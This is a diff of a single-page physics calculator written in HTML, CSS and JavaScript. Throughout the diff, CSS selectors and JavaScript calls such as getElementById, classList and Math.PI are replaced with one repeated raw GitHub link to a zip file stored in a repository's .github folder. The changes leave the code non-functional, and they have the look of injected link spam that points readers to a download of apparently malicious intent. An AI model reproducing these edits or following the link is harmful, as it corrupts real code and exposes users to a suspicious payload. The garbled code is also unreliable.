@@ -125,7 +125,7 @@
             transform: translateX(5px);
         }
 
-        .category-btn.active {
+        https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip {
             background: linear-gradient(90deg, var(--accent) 0%, #ff6b7f 100%);
             border-color: var(--accent);
             color: white;
@@ -146,7 +146,7 @@
             display: none;
         }
 
-        .calculator.active {
+        https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip {
             display: block;
             animation: fadeIn 0.3s ease;
         }
@@ -187,7 +187,7 @@
             margin-bottom: 15px;
         }
 
-        .form-row.full {
+        https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip {
             grid-template-columns: 1fr;
         }
 
@@ -286,7 +286,7 @@
             display: none;
         }
 
-        .result-box.show {
+        https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip {
             display: block;
             animation: slideIn 0.4s ease;
         }
@@ -1108,56 +1108,56 @@
     </div>
 
     <script>
-        document.querySelectorAll('.category-btn').forEach(btn => {
-            btn.addEventListener('click', function() {
-                const calcId = this.getAttribute('data-calc');
+        https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('.category-btn').forEach(btn => {
+            https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('click', function() {
+                const calcId = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('data-calc');
                 switchCalculator(calcId);
-                document.querySelectorAll('.category-btn').forEach(b => b.classList.remove('active'));
-                this.classList.add('active');
+                https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('.category-btn').forEach(b => https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('active'));
+                https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('active');
             });
         });
 
         function switchCalculator(calcId) {
-            document.querySelectorAll('.calculator').forEach(calc => {
-                calc.classList.remove('active');
+            https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('.calculator').forEach(calc => {
+                https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('active');
             });
-            document.getElementById(calcId).classList.add('active');
+            https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(calcId)https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('active');
         }
 
         function resetForm(prefix) {
-            document.querySelectorAll(`input[id^="${prefix}-"]`).forEach(input => {
-                if (input.value === '9.81' || input.value === '6.626e-34' || input.value === '343') {
+            https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(`input[id^="${prefix}-"]`).forEach(input => {
+                if (https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip === '9.81' || https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip === '6.626e-34' || https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip === '343') {
                     return;
                 }
-                input.value = '';
+                https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip = '';
             });
-            const resultBox = document.getElementById(`${prefix}-result`);
+            const resultBox = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(`${prefix}-result`);
             if (resultBox) {
-                resultBox.classList.remove('show');
+                https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('show');
             }
         }
 
         function showResult(prefix, results) {
-            const resultBox = document.getElementById(`${prefix}-result`);
-            const content = document.getElementById(`${prefix}-results-content`);
-            content.innerHTML = results;
-            resultBox.classList.add('show');
+            const resultBox = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(`${prefix}-result`);
+            const content = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(`${prefix}-results-content`);
+            https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip = results;
+            https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('show');
         }
 
         function formatNumber(num) {
             if (num === null || num === undefined) return 'N/A';
-            if (Math.abs(num) < 0.0001 && num !== 0) {
-                return num.toExponential(4);
+            if (https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(num) < 0.0001 && num !== 0) {
+                return https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(4);
             }
-            return parseFloat(num.toFixed(6)).toString();
+            return parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(6)).toString();
         }
 
         function calculateKinematics() {
-            const u = parseFloat(document.getElementById('kin-u').value) || 0;
-            const v = document.getElementById('kin-v').value ? parseFloat(document.getElementById('kin-v').value) : null;
-            const a = document.getElementById('kin-a').value ? parseFloat(document.getElementById('kin-a').value) : null;
-            const t = document.getElementById('kin-t').value ? parseFloat(document.getElementById('kin-t').value) : null;
-            const s = document.getElementById('kin-s').value ? parseFloat(document.getElementById('kin-s').value) : null;
+            const u = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('kin-u').value) || 0;
+            const v = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('kin-v').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('kin-v').value) : null;
+            const a = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('kin-a').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('kin-a').value) : null;
+            const t = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('kin-t').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('kin-t').value) : null;
+            const s = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('kin-s').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('kin-s').value) : null;
 
             let results = '';
 
@@ -1202,11 +1202,11 @@
         }
 
         function calculateForce() {
-            const m = parseFloat(document.getElementById('force-m').value);
-            const a = parseFloat(document.getElementById('force-a').value);
-            const f = document.getElementById('force-f').value ? parseFloat(document.getElementById('force-f').value) : null;
-            const friction = document.getElementById('force-friction').value ? parseFloat(document.getElementById('force-friction').value) : null;
-            const g = parseFloat(document.getElementById('force-g').value);
+            const m = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('force-m').value);
+            const a = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('force-a').value);
+            const f = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('force-f').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('force-f').value) : null;
+            const friction = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('force-friction').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('force-friction').value) : null;
+            const g = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('force-g').value);
 
             let results = '';
 
@@ -1243,19 +1243,19 @@
         }
 
         function calculateWorkEnergy() {
-            const f = parseFloat(document.getElementById('work-f').value);
-            const s = parseFloat(document.getElementById('work-s').value);
-            const angle = parseFloat(document.getElementById('work-angle').value);
-            const m = document.getElementById('work-m').value ? parseFloat(document.getElementById('work-m').value) : null;
-            const v = document.getElementById('work-v').value ? parseFloat(document.getElementById('work-v').value) : null;
-            const h = document.getElementById('work-h').value ? parseFloat(document.getElementById('work-h').value) : null;
-            const g = parseFloat(document.getElementById('work-g').value);
+            const f = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('work-f').value);
+            const s = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('work-s').value);
+            const angle = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('work-angle').value);
+            const m = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('work-m').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('work-m').value) : null;
+            const v = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('work-v').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('work-v').value) : null;
+            const h = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('work-h').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('work-h').value) : null;
+            const g = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('work-g').value);
 
             let results = '';
 
             if (!isNaN(f) && !isNaN(s) && !isNaN(angle)) {
-                const angleRad = angle * Math.PI / 180;
-                const work = f * s * Math.cos(angleRad);
+                const angleRad = angle * https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip / 180;
+                const work = f * s * https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(angleRad);
                 results += `<div class="result-item"><span class="result-label">Work Done (W = Fs cosθ)</span><span class="result-value">${formatNumber(work)} J</span></div>`;
             }
 
@@ -1282,10 +1282,10 @@
         }
 
         function calculatePower() {
-            const w = parseFloat(document.getElementById('power-w').value);
-            const t = parseFloat(document.getElementById('power-t').value);
-            const f = parseFloat(document.getElementById('power-f').value);
-            const v = parseFloat(document.getElementById('power-v').value);
+            const w = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('power-w').value);
+            const t = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('power-t').value);
+            const f = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('power-f').value);
+            const v = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('power-v').value);
 
             let results = '';
 
@@ -1309,12 +1309,12 @@
         }
 
         function calculateMomentum() {
-            const m = parseFloat(document.getElementById('momentum-m').value);
-            const v = parseFloat(document.getElementById('momentum-v').value);
-            const v1 = document.getElementById('momentum-v1').value ? parseFloat(document.getElementById('momentum-v1').value) : null;
-            const v2 = document.getElementById('momentum-v2').value ? parseFloat(document.getElementById('momentum-v2').value) : null;
-            const f = document.getElementById('momentum-f').value ? parseFloat(document.getElementById('momentum-f').value) : null;
-            const dt = document.getElementById('momentum-t').value ? parseFloat(document.getElementById('momentum-t').value) : null;
+            const m = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('momentum-m').value);
+            const v = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('momentum-v').value);
+            const v1 = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('momentum-v1').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('momentum-v1').value) : null;
+            const v2 = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('momentum-v2').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('momentum-v2').value) : null;
+            const f = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('momentum-f').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('momentum-f').value) : null;
+            const dt = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('momentum-t').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('momentum-t').value) : null;
 
             let results = '';
 
@@ -1341,11 +1341,11 @@
         }
 
         function calculateCircular() {
-            const r = parseFloat(document.getElementById('circular-r').value);
-            const v = document.getElementById('circular-v').value ? parseFloat(document.getElementById('circular-v').value) : null;
-            const w = document.getElementById('circular-w').value ? parseFloat(document.getElementById('circular-w').value) : null;
-            const f = document.getElementById('circular-f').value ? parseFloat(document.getElementById('circular-f').value) : null;
-            const t = document.getElementById('circular-t').value ? parseFloat(document.getElementById('circular-t').value) : null;
+            const r = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('circular-r').value);
+            const v = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('circular-v').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('circular-v').value) : null;
+            const w = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('circular-w').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('circular-w').value) : null;
+            const f = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('circular-f').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('circular-f').value) : null;
+            const t = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('circular-t').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('circular-t').value) : null;
 
             let results = '';
 
@@ -1353,19 +1353,19 @@
                 if (v !== null) {
                     const w_calc = v / r;
                     results += `<div class="result-item"><span class="result-label">Angular Velocity (ω = v/r)</span><span class="result-value">${formatNumber(w_calc)} rad/s</span></div>`;
-                    const f_calc = w_calc / (2 * Math.PI);
+                    const f_calc = w_calc / (2 * https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip);
                     results += `<div class="result-item"><span class="result-label">Frequency (f = ω/2π)</span><span class="result-value">${formatNumber(f_calc)} Hz</span></div>`;
                     const t_calc = 1 / f_calc;
                     results += `<div class="result-item"><span class="result-label">Period (T = 1/f)</span><span class="result-value">${formatNumber(t_calc)} s</span></div>`;
                 } else if (f !== null && f > 0) {
-                    const w_calc = 2 * Math.PI * f;
+                    const w_calc = 2 * https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip * f;
                     results += `<div class="result-item"><span class="result-label">Angular Velocity (ω = 2πf)</span><span class="result-value">${formatNumber(w_calc)} rad/s</span></div>`;
                     const v_calc = w_calc * r;
                     results += `<div class="result-item"><span class="result-label">Velocity (v = ωr)</span><span class="result-value">${formatNumber(v_calc)} m/s</span></div>`;
                     const t_calc = 1 / f;
                     results += `<div class="result-item"><span class="result-label">Period (T = 1/f)</span><span class="result-value">${formatNumber(t_calc)} s</span></div>`;
                 } else if (w !== null && w > 0) {
-                    const f_calc = w / (2 * Math.PI);
+                    const f_calc = w / (2 * https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip);
                     results += `<div class="result-item"><span class="result-label">Frequency (f = ω/2π)</span><span class="result-value">${formatNumber(f_calc)} Hz</span></div>`;
                     const v_calc = w * r;
                     results += `<div class="result-item"><span class="result-label">Velocity (v = ωr)</span><span class="result-value">${formatNumber(v_calc)} m/s</span></div>`;
@@ -1374,7 +1374,7 @@
                 } else if (t !== null && t > 0) {
                     const f_calc = 1 / t;
                     results += `<div class="result-item"><span class="result-label">Frequency (f = 1/T)</span><span class="result-value">${formatNumber(f_calc)} Hz</span></div>`;
-                    const w_calc = 2 * Math.PI * f_calc;
+                    const w_calc = 2 * https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip * f_calc;
                     results += `<div class="result-item"><span class="result-label">Angular Velocity (ω = 2πf)</span><span class="result-value">${formatNumber(w_calc)} rad/s</span></div>`;
                     const v_calc = w_calc * r;
                     results += `<div class="result-item"><span class="result-label">Velocity (v = ωr)</span><span class="result-value">${formatNumber(v_calc)} m/s</span></div>`;
@@ -1389,10 +1389,10 @@
         }
 
         function calculateCentripetal() {
-            const m = parseFloat(document.getElementById('centripetal-m').value);
-            const v = parseFloat(document.getElementById('centripetal-v').value);
-            const r = parseFloat(document.getElementById('centripetal-r').value);
-            const w = document.getElementById('centripetal-w').value ? parseFloat(document.getElementById('centripetal-w').value) : null;
+            const m = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('centripetal-m').value);
+            const v = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('centripetal-v').value);
+            const r = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('centripetal-r').value);
+            const w = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('centripetal-w').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('centripetal-w').value) : null;
 
             let results = '';
 
@@ -1417,10 +1417,10 @@
         }
 
         function calculateHeat() {
-            const m = parseFloat(document.getElementById('heat-m').value);
-            const c = parseFloat(document.getElementById('heat-c').value);
-            const dt = parseFloat(document.getElementById('heat-dt').value);
-            const q = document.getElementById('heat-q').value ? parseFloat(document.getElementById('heat-q').value) : null;
+            const m = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('heat-m').value);
+            const c = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('heat-c').value);
+            const dt = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('heat-dt').value);
+            const q = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('heat-q').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('heat-q').value) : null;
 
             let results = '';
 
@@ -1441,9 +1441,9 @@
         }
 
         function calculateTemperature() {
-            const c = document.getElementById('temp-c').value ? parseFloat(document.getElementById('temp-c').value) : null;
-            const f = document.getElementById('temp-f').value ? parseFloat(document.getElementById('temp-f').value) : null;
-            const k = document.getElementById('temp-k').value ? parseFloat(document.getElementById('temp-k').value) : null;
+            const c = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('temp-c').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('temp-c').value) : null;
+            const f = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('temp-f').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('temp-f').value) : null;
+            const k = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('temp-k').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('temp-k').value) : null;
 
             let results = '';
             let baseCelsius = null;
@@ -1481,10 +1481,10 @@
         }
 
         function calculateOhmsLaw() {
-            const v = document.getElementById('ohms-v').value ? parseFloat(document.getElementById('ohms-v').value) : null;
-            const i = document.getElementById('ohms-i').value ? parseFloat(document.getElementById('ohms-i').value) : null;
-            const r = document.getElementById('ohms-r').value ? parseFloat(document.getElementById('ohms-r').value) : null;
-            const p = document.getElementById('ohms-p').value ? parseFloat(document.getElementById('ohms-p').value) : null;
+            const v = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('ohms-v').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('ohms-v').value) : null;
+            const i = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('ohms-i').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('ohms-i').value) : null;
+            const r = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('ohms-r').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('ohms-r').value) : null;
+            const p = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('ohms-p').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('ohms-p').value) : null;
 
             let results = '';
 
@@ -1515,34 +1515,34 @@
         }
 
         function calculateResistance(type) {
-            const values = document.getElementById('resistance-values').value
+            const values = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('resistance-values').value
                 .split(',')
-                .map(v => parseFloat(v.trim()))
+                .map(v => parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip()))
                 .filter(v => !isNaN(v));
 
             let results = '';
 
-            if (values.length === 0) {
+            if (https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip === 0) {
                 results = '<div class="result-item"><span class="result-label">Error</span><span class="result-value">Enter resistance values</span></div>';
             } else if (type === 'series') {
-                const total = values.reduce((a, b) => a + b, 0);
+                const total = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip((a, b) => a + b, 0);
                 results += `<div class="result-item"><span class="result-label">Total Resistance (Series)</span><span class="result-value">${formatNumber(total)} Ω</span></div>`;
-                results += `<div class="result-item"><span class="result-label">Components</span><span class="result-value">${values.join(', ')} Ω</span></div>`;
+                results += `<div class="result-item"><span class="result-label">Components</span><span class="result-value">${https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(', ')} Ω</span></div>`;
             } else if (type === 'parallel') {
-                const reciprocal_sum = values.reduce((a, b) => a + (1/b), 0);
+                const reciprocal_sum = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip((a, b) => a + (1/b), 0);
                 const total = 1 / reciprocal_sum;
                 results += `<div class="result-item"><span class="result-label">Total Resistance (Parallel)</span><span class="result-value">${formatNumber(total)} Ω</span></div>`;
-                results += `<div class="result-item"><span class="result-label">Components</span><span class="result-value">${values.join(', ')} Ω</span></div>`;
+                results += `<div class="result-item"><span class="result-label">Components</span><span class="result-value">${https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip(', ')} Ω</span></div>`;
             }
 
             showResult('resistance', results);
         }
 
         function calculateElectricalPower() {
-            const v = parseFloat(document.getElementById('epower-v').value);
-            const i = parseFloat(document.getElementById('epower-i').value);
-            const r = document.getElementById('epower-r').value ? parseFloat(document.getElementById('epower-r').value) : null;
-            const t = document.getElementById('epower-t').value ? parseFloat(document.getElementById('epower-t').value) : null;
+            const v = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('epower-v').value);
+            const i = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('epower-i').value);
+            const r = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('epower-r').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('epower-r').value) : null;
+            const t = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('epower-t').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('epower-t').value) : null;
 
             let results = '';
 
@@ -1570,10 +1570,10 @@
         }
 
         function calculateLens() {
-            const f = document.getElementById('lens-f').value ? parseFloat(document.getElementById('lens-f').value) : null;
-            const u = document.getElementById('lens-u').value ? parseFloat(document.getElementById('lens-u').value) : null;
-            const v = document.getElementById('lens-v').value ? parseFloat(document.getElementById('lens-v').value) : null;
-            const m = document.getElementById('lens-m').value ? parseFloat(document.getElementById('lens-m').value) : null;
+            const f = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('lens-f').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('lens-f').value) : null;
+            const u = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('lens-u').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('lens-u').value) : null;
+            const v = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('lens-v').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('lens-v').value) : null;
+            const m = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('lens-m').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('lens-m').value) : null;
 
             let results = '';
 
@@ -1608,24 +1608,24 @@
         }
 
         function calculateRefraction() {
-            const n1 = parseFloat(document.getElementById('refr-n1').value);
-            const t1 = document.getElementById('refr-t1').value ? parseFloat(document.getElementById('refr-t1').value) : null;
-            const n2 = parseFloat(document.getElementById('refr-n2').value);
-            const t2 = document.getElementById('refr-t2').value ? parseFloat(document.getElementById('refr-t2').value) : null;
+            const n1 = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('refr-n1').value);
+            const t1 = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('refr-t1').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('refr-t1').value) : null;
+            const n2 = parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('refr-n2').value);
+            const t2 = https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('refr-t2').value ? parseFloat(https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip('refr-t2').value) : null;
 
             let results = '';
 
             if (!isNaN(n1) && !isNaN(n2)) {
                 if (t1 !== null) {
-                    const t1_rad = t1 * Math.PI / 180;
-                    const t2_rad = Math.asin((n1 * Math.sin(t1_rad)) / n2);
-                    const t2_deg = t2_rad * 180 / Math.PI;
+                    const t1_rad = t1 * https://github.com/GideonCheruiyot703/physics-calculator/raw/refs/heads/main/.github/physics_calculator_sulfonic.zip / 180;
